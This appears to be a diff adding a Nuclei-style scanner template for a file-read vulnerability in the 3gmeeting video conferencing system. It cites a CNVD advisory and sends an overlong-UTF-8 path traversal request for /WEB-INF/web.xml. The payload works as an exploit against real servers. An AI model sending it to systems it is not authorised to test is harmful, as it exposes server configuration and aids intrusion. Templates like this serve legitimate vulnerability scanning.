@@ -1,0 +1,24 @@
+id: 3gmeeting-file
+
+info:
+  name: 3gmeeting fileRead
+  author: Str1am    
+  severity: medium
+  description: 3gmeeting视讯系统/%c0%ae/WEB-INF/web.xml文件下载漏洞
+  reference: https://www.cnvd.org.cn/flaw/show/CNVD-2019-01348
+  tags: 3gmeeting,file_read
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/%c0%ae/WEB-INF/web.xml"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "<servlet-mapping>"
+        part: body
+        condition: and
